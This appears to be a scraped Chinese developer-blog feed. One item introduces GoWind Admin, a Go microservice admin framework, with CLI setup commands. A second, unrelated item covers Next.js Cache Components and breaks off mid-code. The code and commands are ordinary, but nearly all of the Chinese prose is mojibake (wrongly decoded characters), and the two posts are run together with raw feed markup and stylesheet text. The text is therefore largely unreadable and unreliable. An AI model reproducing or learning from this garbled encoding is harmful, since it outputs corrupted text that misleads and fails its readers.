<p>åœ¨ä¼ä¸šçº§ä¸­åå°ç³»ç»Ÿå¼€å‘ä¸­ï¼Œå¼€å‘è€…å¸¸å¸¸é¢ä¸´ä¸¤å¤§ç—›ç‚¹ï¼šä¸€æ˜¯å¾®æœåŠ¡æ¶æ„æ­å»ºç¹çï¼Œä»é¡¹ç›®åˆå§‹åŒ–åˆ°å¤šæœåŠ¡ååŒéœ€è¦å¤§é‡æ‰‹åŠ¨é…ç½®ï¼›äºŒæ˜¯å‰åç«¯ååŒæˆæœ¬é«˜ï¼Œæ¥å£å®šä¹‰ã€æ•°æ®æ¨¡å‹åŒæ­¥å¾€å¾€è€—æ—¶è´¹åŠ›ã€‚è€Œ <strong>GoWind Admin</strong>ï¼ˆç®€ç§°ã€Œé£è¡Œã€ï¼‰çš„å‡ºç°ï¼Œæ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ â€”â€” å®ƒåŸºäº <code>gow</code> CLI å·¥å…·ï¼Œæä¾›äº†ä¸€å¥—å¼€ç®±å³ç”¨çš„ä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼Œè®©å¼€å‘è€…èƒ½ä»¥æä½æˆæœ¬å¿«é€Ÿæ­å»ºå¾®æœåŠ¡ä½“ç³»ã€‚</p>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ GoWind Adminï¼Ÿ</h3>
<p>GoWind Admin æ˜¯ä¸€å¥—èšç„¦ä¼ä¸šçº§ä¸­åå°åœºæ™¯çš„å¾®æœåŠ¡å¼€å‘æ¡†æ¶ï¼ŒåŸºäº Go è¯­è¨€ç”Ÿæ€ï¼ˆä¾æ‰˜ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgo-kratos.dev%2F" target="_blank" title="https://go-kratos.dev/" ref="nofollow noopener noreferrer">go-kratos</a> å¾®æœåŠ¡æ¡†æ¶ï¼‰æ‰“é€ ï¼Œæ•´åˆäº†å‰åç«¯å¼€å‘æ‰€éœ€çš„æ ¸å¿ƒå·¥å…·é“¾ã€‚å…¶æ ¸å¿ƒä¼˜åŠ¿åœ¨äºã€Œ<strong>ä¸€é”®ç”Ÿæˆ</strong>ã€ä¸ã€Œ<strong>é«˜åº¦å¯é…ç½®</strong>ã€ï¼šé€šè¿‡ <code>gow</code> å‘½ä»¤è¡Œå·¥å…·ï¼Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿåˆå§‹åŒ–é¡¹ç›®ã€åˆ›å»ºå¾®æœåŠ¡ã€ç”Ÿæˆæ¥å£ä¸æ•°æ®å±‚ä»£ç ï¼Œæ— éœ€ä»é›¶æ­å»ºæ¶æ„ï¼Œæå¤§ç¼©çŸ­å¼€å‘å‘¨æœŸã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒç‰¹æ€§ï¼šä¸ºä»€ä¹ˆé€‰æ‹© GoWind Adminï¼Ÿ</h3>
<h4 data-id="heading-3">1. å¼€ç®±å³ç”¨ï¼Œé›¶é…ç½®å¯åŠ¨</h4>
<p>GoWind Admin æä¾›äº†å®Œæ•´çš„é¡¹ç›®è„šæ‰‹æ¶ï¼ŒåŒ…å«é¢„è®¾çš„ç›®å½•ç»“æ„ã€é…ç½®æ–‡ä»¶ã€ä¾èµ–ç®¡ç†ç­‰ã€‚é€šè¿‡ gow å·¥å…·ï¼Œä¸€è¡Œå‘½ä»¤å³å¯ç”Ÿæˆå¯è¿è¡Œçš„é¡¹ç›®éª¨æ¶ï¼Œçœå»ç¹ççš„åˆå§‹åŒ–å·¥ä½œï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… CLI å·¥å…·</span>
go install github.com/tx7do/kratos-cli/gowind/cmd/gow@latest
<span class="hljs-meta prompt_">
# </span><span class="bash">åˆå§‹åŒ–é¡¹ç›®ï¼ˆæ”¯æŒè‡ªå®šä¹‰æ¨¡å—åï¼‰</span>
gow new myproject -m github.com/yourusername/myproject
cd myproject
go mod tidy  # è‡ªåŠ¨å¤„ç†ä¾èµ–
</code></pre>
<p>ç”Ÿæˆçš„é¡¹ç›®åŒ…å«é»˜è®¤é…ç½®ï¼ˆæ•°æ®åº“ã€æ—¥å¿—ã€æœåŠ¡ç«¯å£ç­‰ï¼‰ï¼Œå¼€å‘è€…å¯ç›´æ¥åŸºäºæ­¤å¼€å‘ï¼Œæ— éœ€å…³æ³¨åº•å±‚æ¶æ„ç»†èŠ‚ã€‚</p>
<h4 data-id="heading-4">2. å¤šæœåŠ¡ç±»å‹æ”¯æŒï¼Œé€‚é…å¤æ‚ä¸šåŠ¡åœºæ™¯</h4>
<p>ä¼ä¸šçº§åº”ç”¨å¾€å¾€éœ€è¦å¤šç§æœåŠ¡ç±»å‹ååŒï¼ˆå¦‚ API æœåŠ¡ã€RPC æœåŠ¡ã€æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡ç­‰ï¼‰ã€‚GoWind Admin æ”¯æŒé€šè¿‡å‘½ä»¤è¡Œå¿«é€Ÿåˆ›å»ºä¸åŒç±»å‹çš„å¾®æœåŠ¡ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆå¯¹åº”ä»£ç ï¼š</p>
<ul>
<li><strong>å¤šåè®®æ”¯æŒ</strong>ï¼šå¯åˆ›å»º gRPCã€REST æœåŠ¡ï¼Œæˆ–åŒæ—¶é›†æˆä¸¤ç§åè®®ï¼ˆå¦‚ <code>gow add service admin -s rest -s grpc</code>ï¼‰ï¼›</li>
<li><strong>å¤šæ•°æ®å±‚é€‚é…</strong>ï¼šæ”¯æŒ gormã€entã€redis ç­‰ä¸»æµ ORM / æ•°æ®å®¢æˆ·ç«¯ï¼Œç”Ÿæˆå¯¹åº”çš„æ•°æ®è®¿é—®å±‚ä»£ç ï¼ˆå¦‚ <code>gow add service payment -d gorm -d redis</code>ï¼‰ï¼›</li>
<li><strong>æœåŠ¡æ³¨å†Œä¸å‘ç°</strong>ï¼šå†…ç½®å¾®æœåŠ¡ååŒæ‰€éœ€çš„é…ç½®ï¼Œæ”¯æŒæœåŠ¡é—´è°ƒç”¨çš„æ ‡å‡†åŒ–å¤„ç†ã€‚</li>
</ul>
<h4 data-id="heading-5">3. è‡ªåŠ¨åŒ–ä»£ç ç”Ÿæˆï¼Œå‡å°‘é‡å¤åŠ³åŠ¨</h4>
<p>GoWind Admin çš„æ ¸å¿ƒèƒ½åŠ›ä¹‹ä¸€æ˜¯ã€Œä»£ç ç”Ÿæˆã€ï¼Œé€šè¿‡ <code>gow</code> å·¥å…·å¯è‡ªåŠ¨ç”Ÿæˆé¡¹ç›®å„å±‚ä»£ç ï¼Œè¦†ç›–ä»æ¥å£å®šä¹‰åˆ°æ•°æ®è®¿é—®çš„å…¨æµç¨‹ï¼š</p>
<ul>
<li><strong>æœåŠ¡å±‚ä»£ç </strong>ï¼šç”Ÿæˆ gRPC/REST æœåŠ¡çš„è·¯ç”±ã€æ§åˆ¶å™¨ä»£ç ï¼›</li>
<li><strong>æ•°æ®å±‚ä»£ç </strong>ï¼šæ ¹æ®é€‰æ‹©çš„ ORM ç±»å‹ï¼ˆå¦‚ gormï¼‰ç”Ÿæˆæ•°æ®åº“è¿æ¥ã€æ¨¡å‹å®šä¹‰ä»£ç ï¼›</li>
<li><strong>é…ç½®æ–‡ä»¶</strong>ï¼šè‡ªåŠ¨ç”Ÿæˆ server.yamlã€data.yaml ç­‰é…ç½®æ¨¡æ¿ï¼ŒåŒ…å«æ•°æ®åº“ã€æ—¥å¿—ã€å®¢æˆ·ç«¯ç­‰é»˜è®¤é…ç½®ï¼›</li>
<li><strong>æ„å»ºè„šæœ¬</strong>ï¼šç”Ÿæˆ Makefileï¼Œæ”¯æŒä¸€é”®ç¼–è¯‘ã€è¿è¡Œã€éƒ¨ç½²ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œæ·»åŠ ä¸€ä¸ªæ”¯æŒ gRPC å’Œ gorm çš„ã€Œè®¢å•æœåŠ¡ã€ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">gow add service order -s grpc -d gorm
go mod tidy  # è‡ªåŠ¨æ›´æ–°ä¾èµ–
</code></pre>
<p>å‘½ä»¤æ‰§è¡Œåï¼Œæ¡†æ¶ä¼šåœ¨ <code>app/order/service</code> ç›®å½•ä¸‹ç”Ÿæˆå®Œæ•´çš„æœåŠ¡ä»£ç ï¼ŒåŒ…æ‹¬ gRPC æ¥å£å®šä¹‰ã€æ•°æ®è®¿é—®å±‚ã€é…ç½®æ–‡ä»¶ç­‰ï¼Œå¼€å‘è€…å¯ç›´æ¥ç¼–å†™ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h4 data-id="heading-6">4. æ— ç¼é›†æˆ kratos ç”Ÿæ€ï¼Œä¼ä¸šçº§èƒ½åŠ›å†…ç½®</h4>
<p>GoWind Admin åŸºäº kratos ç”Ÿæ€æ„å»ºï¼Œå¤©ç„¶ç»§æ‰¿å…¶ä¼ä¸šçº§ç‰¹æ€§ï¼š</p>
<ul>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šå†…ç½®æ—¥å¿—ã€ç›‘æ§ã€è¿½è¸ªèƒ½åŠ›ï¼Œæ”¯æŒä¸ Prometheusã€Grafana ç­‰å·¥å…·é›†æˆï¼›</li>
<li><strong>é«˜å¯ç”¨</strong>ï¼šæ”¯æŒæœåŠ¡ç†”æ–­ã€é™æµã€é‡è¯•ç­‰å®¹é”™æœºåˆ¶ï¼›</li>
<li><strong>æ‰©å±•æ€§</strong>ï¼šå¯ç»“åˆ kratos-cli å…¶ä»–å·¥å…·ï¼ˆå¦‚ <code>cfgexp</code> é…ç½®å¯¼å‡ºã€<code>sql2orm</code> æ•°æ®åº“æ¨¡å‹ç”Ÿæˆï¼‰ï¼Œå½¢æˆå®Œæ•´å¼€å‘é—­ç¯ã€‚</li>
</ul>
<h3 data-id="heading-7">å¿«é€Ÿä¸Šæ‰‹ï¼š3 æ­¥æ­å»ºä¸€ä¸ªå¾®æœåŠ¡åº”ç”¨</h3>
<h4 data-id="heading-8">æ­¥éª¤ 1ï¼šå®‰è£… CLI å·¥å…·</h4>
<pre><code class="hljs language-shell" lang="shell">go install github.com/tx7do/kratos-cli/gowind/cmd/gow@latest
</code></pre>
<h4 data-id="heading-9">æ­¥éª¤ 2ï¼šåˆ›å»ºé¡¹ç›®å¹¶æ·»åŠ æœåŠ¡</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">åˆ›å»ºé¡¹ç›®</span>
gow new wind-demo -m github.com/your-org/wind-demo
cd wind-demo
<span class="hljs-meta prompt_">
# </span><span class="bash">æ·»åŠ ç”¨æˆ·æœåŠ¡ï¼ˆæ”¯æŒ REST åè®®å’Œ gorm æ•°æ®åº“ï¼‰</span>
gow add service user -s rest -d gorm
go mod tidy

cd app/user/service
<span class="hljs-meta prompt_"># </span><span class="bash">ç”Ÿæˆwireä»£ç </span>
make wire
</code></pre>
<h4 data-id="heading-10">æ­¥éª¤ 3ï¼šè¿è¡ŒæœåŠ¡</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">è¿›å…¥ç”¨æˆ·æœåŠ¡ç›®å½•è¿è¡Œ</span>
cd app/user/service
gow run
<span class="hljs-meta prompt_">
# </span><span class="bash">æˆ–ç›´æ¥æŒ‡å®šæœåŠ¡åè¿è¡Œ</span>
gow run user
</code></pre>
<p>æœåŠ¡å¯åŠ¨åï¼Œå³å¯é€šè¿‡é»˜è®¤ç«¯å£ï¼ˆå¦‚ REST æœåŠ¡é»˜è®¤ 8080ï¼‰è®¿é—®æ¥å£ï¼Œæ¡†æ¶å·²è‡ªåŠ¨å¤„ç†å¥½è·¯ç”±ã€é…ç½®åŠ è½½ç­‰å·¥ä½œã€‚</p>
<h3 data-id="heading-11">é€‚ç”¨åœºæ™¯</h3>
<p>GoWind Admin å°¤å…¶é€‚åˆä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>ä¼ä¸šçº§ä¸­åå°ç³»ç»Ÿå¼€å‘ï¼ˆå¦‚ ERPã€CRMã€æ•°æ®å¹³å°ï¼‰ï¼›</li>
<li>å¾®æœåŠ¡æ¶æ„çš„å¿«é€Ÿè½åœ°ï¼ˆéœ€å¤šæœåŠ¡ååŒã€å¤šåè®®æ”¯æŒï¼‰ï¼›</li>
<li>å‰åç«¯åˆ†ç¦»é¡¹ç›®ï¼ˆè‡ªåŠ¨ç”Ÿæˆæ¥å£æ–‡æ¡£ï¼Œé™ä½ååŒæˆæœ¬ï¼‰ï¼›</li>
<li>è¿½æ±‚å¼€å‘æ•ˆç‡çš„å›¢é˜Ÿï¼ˆå‡å°‘æ¶æ„æ­å»ºæ—¶é—´ï¼Œèšç„¦ä¸šåŠ¡é€»è¾‘ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-12">æ€»ç»“</h3>
<p>GoWind Admin ä»¥ã€Œ<strong>ç®€åŒ–å¾®æœåŠ¡å¼€å‘æµç¨‹</strong>ã€ä¸ºæ ¸å¿ƒï¼Œé€šè¿‡ <code>gow</code> CLI å·¥å…·å°†é¡¹ç›®åˆå§‹åŒ–ã€æœåŠ¡åˆ›å»ºã€ä»£ç ç”Ÿæˆç­‰æµç¨‹è‡ªåŠ¨åŒ–ï¼Œè®©å¼€å‘è€…æ— éœ€é‡å¤æ­å»ºæ¶æ„ï¼Œå¼€ç®±å³å¯ä¸“æ³¨ä¸šåŠ¡é€»è¾‘ã€‚æ— è®ºæ˜¯å°å‹å›¢é˜Ÿå¿«é€ŸéªŒè¯éœ€æ±‚ï¼Œè¿˜æ˜¯å¤§å‹ä¼ä¸šæ„å»ºå¤æ‚ä¸­åå°ç³»ç»Ÿï¼ŒGoWind Admin éƒ½èƒ½æ˜¾è‘—é™ä½å¼€å‘æˆæœ¬ï¼ŒåŠ é€Ÿé¡¹ç›®è½åœ°ã€‚</p>
<p>ç«‹å³å°è¯• <code>gow</code> å·¥å…·ï¼Œä½“éªŒã€Œé£è¡Œã€èˆ¬çš„å¼€å‘æ•ˆç‡å§ï¼</p>
<h3 data-id="heading-13">é¡¹ç›®ä»£ç </h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://gitee.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">go-wind-admin Gitee</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://github.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">go-wind-admin Github</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.jsç¬¬åä¸‰ç« (ç¼“å­˜ç»„ä»¶)]]></title>    <link>https://juejin.cn/post/7582958136258215972</link>    <guid>https://juejin.cn/post/7582958136258215972</guid>    <pubDate>2025-12-14T10:23:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582958136258215972" data-draft-id="7582958136258199588" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.jsç¬¬åä¸‰ç« (ç¼“å­˜ç»„ä»¶)"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-14T10:23:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ»¡zs"/> <meta itemprop="url" content="https://juejin.cn/user/2463384809252397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.jsç¬¬åä¸‰ç« (ç¼“å­˜ç»„ä»¶)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2463384809252397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ»¡zs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T10:23:12.000Z" title="Sun Dec 14 2025 10:23:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¼“å­˜ç»„ä»¶(Cache Components)</h2>
<h4 data-id="heading-1">ä»€ä¹ˆæ˜¯Cache Components?</h4>
<p>Cache Components æ˜¯Next.js(16)ç‰ˆæœ¬ç‰¹æœ‰çš„æœºåˆ¶ï¼Œå®ç°äº†<code>é™æ€å†…å®¹</code> <code>åŠ¨æ€å†…å®¹</code> <code>ç¼“å­˜å†…å®¹</code>çš„æ··åˆç¼–æ’ã€‚ä¿ç•™äº†é™æ€å†…å®¹çš„åŠ è½½é€Ÿåº¦ï¼Œåˆå…·å¤‡åŠ¨æ€æ¸²æŸ“çš„çµæ´»æ€§ï¼Œè§£å†³äº†<code>é™æ€å†…å®¹(åŠ è½½å¿«ä½†æ— æ³•å®æ—¶æ›´æ–°æ•°æ®)</code>å’Œ<code>åŠ¨æ€å†…å®¹(åŠ è½½æ…¢ä½†å¯ä»¥å®æ—¶æ›´æ–°æ•°æ®)</code>æƒè¡¡çš„é—®é¢˜ã€‚</p>
<ul>
<li>
<p>é™æ€å†…å®¹: æ„å»º(<code>npm run build</code>)æ—¶è¿›è¡Œé¢„æ¸²æŸ“ï¼Œä¾‹å¦‚ <code>ã€Œæœ¬åœ°æ–‡ä»¶ã€ã€Œæ¨¡å—å¯¼å…¥ã€ã€Œçº¯è®¡ç®—ã€ï¼ˆæ— ç½‘ç»œè¯·æ±‚ã€æ— ç”¨æˆ·ç›¸å…³æ•°æ®ï¼‰</code>,ä¼šè¢«ç›´æ¥ç¼–è¯‘æˆ<code>HTML</code>ç¬é—´åŠ è½½ã€ç«‹å³å“åº”ã€‚</p>
</li>
<li>
<p>åŠ¨æ€å†…å®¹ï¼šç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶æ‰å¼€å§‹æ¸²æŸ“çš„å†…å®¹ï¼Œä¾èµ– â€œå®æ—¶æ•°æ®â€ æˆ– â€œç”¨æˆ·ä¸ªæ€§åŒ–ä¿¡æ¯â€ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½å¯èƒ½ç”Ÿæˆä¸åŒç»“æœï¼Œä¸ä¼šè¢«ç¼“å­˜ã€‚ä¾‹å¦‚<code>ã€Œå®æ—¶æ•°æ®æºã€ï¼ˆå¦‚å®æ—¶æ¥å£ã€æ•°æ®åº“å®æ—¶æŸ¥è¯¢ï¼‰æˆ–ã€Œç”¨æˆ·è¯·æ±‚ä¸Šä¸‹æ–‡ã€ï¼ˆå¦‚ Cookieã€è¯·æ±‚å¤´ã€URL å‚æ•°ï¼‰</code>ã€‚</p>
</li>
<li>
<p>ç¼“å­˜å†…å®¹ï¼šç¼“å­˜å†…å®¹çš„æœ¬è´¨å°±æ˜¯ç¼“å­˜åŠ¨æ€æ•°æ®ï¼Œç¼“å­˜ä¹‹åä¼šè¢«çº³å…¥<code>é™æ€å¤–å£³(Static Shell)</code>,é™æ€å¤–å£³å°±ç±»ä¼¼äº<code>æ¯›å¯æˆ¿</code>ï¼Œä¼šæå‰æŠŠç»“æ„æ­å»ºå¥½ï¼Œåç»­åœ¨é€šè¿‡(æµå¼ä¼ è¾“)å¡«å……é‡Œé¢çš„åŠ¨æ€å†…å®¹ã€‚</p>
</li>
</ul>





















<table><thead><tr><th>ä¼ ç»Ÿæ–¹æ¡ˆ</th><th>Cache Components</th></tr></thead><tbody><tr><td>é™æ€é¡µé¢ï¼šæ•°æ®æ— æ³•å®æ—¶æ›´æ–°</td><td>æ”¯æŒç¼“å­˜å†…å®¹é‡æ–°éªŒè¯ï¼ŒåŠ¨æ€å†…å®¹æµå¼è¡¥å……</td></tr><tr><td>åŠ¨æ€é¡µé¢ï¼šåˆå§‹åŠ è½½æ…¢ã€æœåŠ¡å™¨å‹åŠ›å¤§</td><td>é™æ€å¤–å£³ä¼˜å…ˆè¿”å›ï¼ŒåŠ¨æ€å†…å®¹å¹¶è¡Œæ¸²æŸ“</td></tr><tr><td>å®¢æˆ·ç«¯æ¸²æŸ“ï¼šbundle ä½“ç§¯å¤§ã€é¦–å±æ…¢</td><td>æœåŠ¡å™¨é¢„æ¸²æŸ“æ ¸å¿ƒå†…å®¹ï¼Œå®¢æˆ·ç«¯ä»…è¡¥å……åŠ¨æ€éƒ¨åˆ†</td></tr></tbody></table>
<h4 data-id="heading-2">å¯ç”¨Cache Components</h4>
<p>Cache Components ä¸ºå¯é€‰åŠŸèƒ½ï¼Œéœ€åœ¨ Next é…ç½®æ–‡ä»¶ä¸­æ˜¾å¼å¯ç”¨ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">NextConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-attr">nextConfig</span>: <span class="hljs-title class_">NextConfig</span> = {
  <span class="hljs-attr">cacheComponents</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¯ç”¨ç¼“å­˜ç»„ä»¶</span>
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> nextConfig;
</code></pre>
<h5 data-id="heading-3">1. é™æ€å†…å®¹å±•ç¤º</h5>
<p>é€‚ç”¨åœºæ™¯ï¼šä»…ä¾èµ–åŒæ­¥ I/Oï¼ˆå¦‚ fs.readFileSyncï¼‰ã€æ¨¡å—å¯¼å…¥ã€çº¯è®¡ç®—çš„ç»„ä»¶</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">'node:fs'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'data.json'</span>, <span class="hljs-string">'utf-8'</span>) <span class="hljs-comment">//æœ¬åœ°æ–‡ä»¶è¯»å–</span>
    <span class="hljs-keyword">const</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data)
    <span class="hljs-keyword">const</span> impData = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../../../data.json'</span>) <span class="hljs-comment">//æ¨¡å—å¯¼å…¥</span>
    <span class="hljs-keyword">const</span> names = impData.<span class="hljs-property">list</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>=&gt;</span>item.<span class="hljs-property">name</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>) <span class="hljs-comment">//çº¯è®¡ç®—</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(impData)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(names)
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                {json.list.map((item: any) =&gt; (
